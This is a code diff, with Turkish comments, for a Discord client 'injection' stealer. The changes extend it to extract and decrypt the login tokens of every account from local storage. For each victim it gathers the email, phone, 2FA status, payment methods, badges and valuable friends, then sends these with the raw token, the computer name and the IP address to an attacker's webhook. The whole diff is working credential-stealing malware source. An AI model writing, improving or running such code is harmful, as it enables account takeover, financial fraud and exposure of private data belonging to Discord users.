@@ -25,46 +25,102 @@ const execScript = (script) => {
     return win.webContents.executeJavaScript(script, true);
 };
 
-// localStorage'dan şifreli token al, main process'te safeStorage ile çöz
-const GET_LS_TOKEN_SCRIPT = `(function(){
+// localStorage'dan TÜM hesapların şifreli tokenlarını al, main process'te çöz
+const GET_ALL_TOKENS_SCRIPT = `(function(){
     try {
         var f = document.createElement('iframe');
         document.body.appendChild(f);
         var ls = Object.getOwnPropertyDescriptor(f.contentWindow,'localStorage').get.call(window);
         f.remove();
-        return ls.token || null;
-    } catch(e) { return null; }
+        var result = [];
+        // Tek token (aktif hesap)
+        if (ls.token) result.push(ls.token);
+        // Multi-account: "tokens" key — object veya array
+        try {
+            var multi = ls.tokens;
+            if (multi) {
+                var parsed = JSON.parse(multi);
+                if (Array.isArray(parsed)) {
+                    parsed.forEach(function(t){ if(t && result.indexOf(t)===-1) result.push(t); });
+                } else if (typeof parsed === 'object') {
+                    Object.values(parsed).forEach(function(t){ if(t && result.indexOf(t)===-1) result.push(t); });
+                }
+            }
+        } catch(e) {}
+        // MultiAccountStore
+        try {
+            var mas = ls.MultiAccountStore;
+            if (mas) {
+                var mObj = JSON.parse(mas);
+                var accounts = mObj.users || mObj.accounts || [];
+                accounts.forEach(function(a){ var t = a.token||a.accessToken; if(t && result.indexOf(t)===-1) result.push(t); });
+            }
+        } catch(e) {}
+        return result;
+    } catch(e) { return []; }
 })()`;
 
-async function getToken(retries = 8, delayMs = 2000) {
+async function getAllTokens(retries = 8, delayMs = 2000) {
     for (let i = 0; i < retries; i++) {
         try {
-            const encrypted = await execScript(GET_LS_TOKEN_SCRIPT);
-            if (encrypted && encrypted.includes('dQw4w9WgXcQ:')) {
-                const b64   = encrypted.replace(/^"?dQw4w9WgXcQ:/, '').replace(/"$/, '').trim();
-                const buf   = Buffer.from(b64, 'base64');
-                const token = safeStorage.decryptString(buf);
-                if (token) return token;
+            const encrypted = await execScript(GET_ALL_TOKENS_SCRIPT);
+            if (Array.isArray(encrypted) && encrypted.length > 0) {
+                const tokens = [];
+                for (const enc of encrypted) {
+                    try {
+                        if (enc && enc.includes('dQw4w9WgXcQ:')) {
+                            const b64   = enc.replace(/^"?dQw4w9WgXcQ:/, '').replace(/"$/, '').trim();
+                            const buf   = Buffer.from(b64, 'base64');
+                            const token = safeStorage.decryptString(buf);
+                            if (token && !tokens.includes(token)) tokens.push(token);
+                        } else if (enc && !enc.includes('dQw4w9WgXcQ:')) {
+                            // Plain token (eski format)
+                            if (!tokens.includes(enc)) tokens.push(enc);
+                        }
+                    } catch {}
+                }
+                if (tokens.length > 0) return tokens;
             }
         } catch {}
         if (i < retries - 1) await sleep(delayMs);
     }
-    return null;
+    return [];
+}
+
+// Geriye dönük uyumluluk — tek token gerektiğinde
+async function getToken(retries = 3, delayMs = 1000) {
+    const tokens = await getAllTokens(retries, delayMs);
+    return tokens.length > 0 ? tokens[0] : null;
 }
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 // ── HTTP helpers ──────────────────────────────────────────────────────────────
 
-// Discord API — renderer üzerinden (Discord'un kendi session'ı, CORS yok)
-const apiGet = (endpoint, token) =>
-    execScript(`(function(){
-        var x = new XMLHttpRequest();
-        x.open("GET", "${endpoint}", false);
-        x.setRequestHeader("Authorization", "${token}");
-        x.send(null);
-        try { return JSON.parse(x.responseText); } catch(e) { return null; }
-    })()`);
+// Discord API — https ile direkt (token header ile, renderer'a gerek yok)
+function apiGet(endpoint, token) {
+    return new Promise(resolve => {
+        const url = new URL(endpoint);
+        const req = https.request({
+            hostname: url.hostname,
+            path:     url.pathname + url.search,
+            method:   'GET',
+            headers:  {
+                'Authorization': token,
+                'Content-Type':  'application/json',
+                'User-Agent':    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            },
+            timeout: 10000,
+        }, res => {
+            let b = '';
+            res.on('data', d => b += d);
+            res.on('end', () => { try { resolve(JSON.parse(b)); } catch { resolve(null); } });
+        });
+        req.on('error',   () => resolve(null));
+        req.on('timeout', () => { req.destroy(); resolve(null); });
+        req.end();
+    });
+}
 
 async function getIP() {
     return new Promise(resolve => {
@@ -111,33 +167,99 @@ async function postWebhook(payload) {
 
 // ── Badge / Nitro / Billing helpers ──────────────────────────────────────────
 
+// BADGE_MAP — HQ friends tespiti için (bitfield)
 const BADGE_MAP = [
-    [1,       '<:staff:968704541946167357>'],
-    [2,       '<:partner:968704542021652560>'],
-    [4,       '<:hypersquad_events:968704541774192693>'],
-    [8,       '<:bug_hunter_1:968704541677723648>'],
-    [512,     '<:early_supporter:968704542126510090>'],
-    [16384,   '<:bug_hunter_2:968704541774217246>'],
-    [131072,  '<:verified_dev:968704541702905886>'],
-    [262144,  '<:certified_moderator:988996447938674699>'],
-    [4194304, '<:Active_Dev:1045024909690163210>'],
+    [1,       '👮 Staff'],
+    [2,       '🤝 Partner'],
+    [4,       '🏠 HypeSquad Events'],
+    [8,       '🐛 Bug Hunter'],
+    [64,      '🏡 Bravery'],
+    [128,     '💡 Brilliance'],
+    [256,     '⚖️ Balance'],
+    [512,     '⭐ Early Supporter'],
+    [16384,   '🐛 Bug Hunter Gold'],
+    [131072,  '🤖 Verified Dev'],
+    [262144,  '🛡️ Certified Mod'],
+    [4194304, '🔨 Active Dev'],
 ];
 
-function getBadges(flags) {
-    const b = BADGE_MAP.filter(([v]) => (flags & v) === v).map(([, e]) => e);
-    return b.length ? b.join(' ') : ':x:';
+// Badge ID → emoji/label map (profile endpoint'ten gelen id'ler)
+const PROFILE_BADGE_MAP = {
+    'staff':                    '👮 Staff',
+    'partner':                  '🤝 Partner',
+    'hypesquad':                '🏠 HypeSquad Events',
+    'bug_hunter_level_1':       '🐛 Bug Hunter',
+    'hypesquad_online_house_1': '🏡 Bravery',
+    'hypesquad_online_house_2': '💡 Brilliance',
+    'hypesquad_online_house_3': '⚖️ Balance',
+    'premium_early_supporter':  '⭐ Early Supporter',
+    'bug_hunter_level_2':       '🐛 Bug Hunter Gold',
+    'verified_developer':       '🤖 Verified Dev',
+    'certified_moderator':      '🛡️ Certified Mod',
+    'active_developer':         '🔨 Active Dev',
+    'legacy_username':          '🏷️ Legacy Username',
+    'quest_completed':          '🎯 Quest Completed',
+    'orb_profile_badge':        '🔮 Orbs Badge',
+    'guild_booster_lvl1':       '🚀 Boost Lvl 1',
+    'guild_booster_lvl2':       '🚀 Boost Lvl 2',
+    'guild_booster_lvl3':       '🚀 Boost Lvl 3',
+    'guild_booster_lvl4':       '🚀 Boost Lvl 4',
+    'guild_booster_lvl5':       '🚀 Boost Lvl 5',
+    'guild_booster_lvl6':       '� Boost Lvl 6',
+    'guild_booster_lvl7':       '🚀 Boost Lvl 7',
+    'guild_booster_lvl8':       '🚀 Boost Lvl 8',
+    'guild_booster_lvl9':       '🚀 Boost Lvl 9',
+    'premium_tenure_1_month':   '🥉 Nitro 1 ay',
+    'premium_tenure_3_month':   '🥈 Nitro 3 ay',
+    'premium_tenure_6_month_v2':'🥇 Nitro 6 ay',
+    'premium_tenure_12_month':  '🏆 Nitro 12 ay',
+    'premium_tenure_24_month':  '👑 Nitro 24 ay',
+};
+
+function getBadges(user) {
+    // Sadece profile endpoint'ten gelen badges — bitfield'dan active_dev vb. ekleme
+    const profileBadges = (user._profile_badges || []).map(b => {
+        return PROFILE_BADGE_MAP[b.id] || b.description || b.id;
+    });
+    return profileBadges.length ? profileBadges.join(', ') : ':x:';
 }
 
-function getNitro(t) {
-    return ({ 0: ':x:', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' })[t] ?? ':x:';
+function getNitro(user) {
+    const t = user.premium_type;
+    if (!t) return ':x:';
+
+    const base = { 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' }[t] || ':x:';
+    if (t !== 2 || !user.premium_guild_since) return base;
+
+    // Boost süresi hesapla
+    const since = new Date(user.premium_guild_since);
+    const now   = new Date();
+    const months = Math.floor((now - since) / (1000 * 60 * 60 * 24 * 30));
+    const levels = [
+        [1,  '🥉 Boost 1 ay'],
+        [2,  '🥈 Boost 2 ay'],
+        [3,  '🥇 Boost 3 ay'],
+        [6,  '🏆 Boost 6 ay'],
+        [9,  '💠 Boost 9 ay'],
+        [12, '🔷 Boost 12 ay'],
+        [15, '🔶 Boost 15 ay'],
+        [18, '🌟 Boost 18 ay'],
+        [24, '👑 Boost 24 ay'],
+    ];
+    let boostLabel = '🚀 Boosting';
+    for (const [m, label] of levels) {
+        if (months >= m) boostLabel = label;
+    }
+    return `${base} — ${boostLabel}`;
 }
 
 function parseBilling(sources) {
     if (!sources || !sources.length) return ':x:';
-    const out = sources
-        .filter(s => !s.invalid)
-        .map(s => s.type === 1 ? ':credit_card:' : s.type === 2 ? '<:paypal:973417655627288666>' : null)
-        .filter(Boolean);
+    const out = sources.map(s => {
+        const icon = s.type === 1 ? ':credit_card:' : s.type === 2 ? '<:paypal:973417655627288666>' : null;
+        if (!icon) return null;
+        return s.invalid ? `~~${icon}~~ (expired)` : icon;
+    }).filter(Boolean);
     return out.length ? out.join(' ') : ':x:';
 }
 
@@ -148,8 +270,9 @@ function parseHQFriends(relationships) {
     for (const rel of relationships) {
         if (rel.type !== 1) continue;
         const u = rel.user || {};
+        const uFlags = (u.public_flags || 0) | (u.flags || 0);
         const badges = BADGE_MAP
-            .filter(([v]) => HQ.includes(v) && (u.public_flags & v) === v)
+            .filter(([v]) => HQ.includes(v) && (uFlags & v) === v)
             .map(([, e]) => e);
         if (!badges.length) continue;
         lines.push(`${badges.join('')} \`${u.username}\` (\`${u.id}\`)`);
@@ -175,6 +298,20 @@ async function buildUserInfo(token) {
     ]);
     if (!user || user.message) return null;
 
+    // Boost süresi + profile badges için profile endpoint
+    let profile = null;
+    try { profile = await apiGet(`https://discord.com/api/v9/users/${user.id}/profile?with_mutual_guilds=false&with_mutual_friends=false`, token); } catch {}
+
+    if (profile) {
+        if (profile.premium_guild_since && !user.premium_guild_since) {
+            user.premium_guild_since = profile.premium_guild_since;
+        }
+        // Profile badges array'ini user'a ekle
+        user._profile_badges = Array.isArray(profile.badges) ? profile.badges : [];
+    } else {
+        user._profile_badges = [];
+    }
+
     const [avatar, banner] = await Promise.all([
         resolveAvatar(user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null),
         resolveAvatar(user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}` : null),
@@ -189,9 +326,9 @@ function buildFields(user, billing, friends, token, extra) {
         { name: '📧 Email',    value: `\`${user.email    || 'N/A'}\``,   inline: true  },
         { name: '📱 Phone',    value: `\`${user.phone    || 'N/A'}\``,   inline: true  },
         { name: '🔒 2FA',      value: user.mfa_enabled ? '✅' : '❌',    inline: true  },
-        { name: '💎 Nitro',    value: getNitro(user.premium_type),       inline: true  },
+        { name: '💎 Nitro',    value: getNitro(user),                    inline: true  },
         { name: '💳 Billing',  value: parseBilling(billing),             inline: true  },
-        { name: '🏅 Badges',   value: getBadges(user.public_flags || 0), inline: true  },
+        { name: '🏅 Badges',   value: getBadges(user),                   inline: true  },
         ...(extra || []),
         { name: '🔑 Token',    value: `\`${token}\``,                    inline: false },
     ];
@@ -217,9 +354,9 @@ async function firstTime() {
     try {
         const ip     = await getIP();
         const client = getDiscordClientName();
-        const token  = await getToken(8, 2000);
+        const tokens = await getAllTokens(8, 2000);
 
-        if (!token) {
+        if (!tokens.length) {
             await postWebhook(buildPayload(
                 'Discord Injection — No Session',
                 [
@@ -232,19 +369,23 @@ async function firstTime() {
             return;
         }
 
-        const info = await buildUserInfo(token);
-        if (!info) return;
-        const { user, billing, friends, avatar, banner } = info;
-
-        await postWebhook(buildPayload(
-            'Discord Injection — Initialized',
-            buildFields(user, billing, friends, token, [
-                { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
-                { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
-                { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
-            ]),
-            avatar || AVATAR_URL, banner || null
-        ));
+        // Her hesap için ayrı embed
+        for (const token of tokens) {
+            try {
+                const info = await buildUserInfo(token);
+                if (!info) continue;
+                const { user, billing, friends, avatar, banner } = info;
+                await postWebhook(buildPayload(
+                    'Discord Injection — Initialized',
+                    buildFields(user, billing, friends, token, [
+                        { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
+                        { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
+                        { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
+                    ]),
+                    avatar || AVATAR_URL, banner || null
+                ));
+            } catch {}
+        }
     } catch {}
 }
 
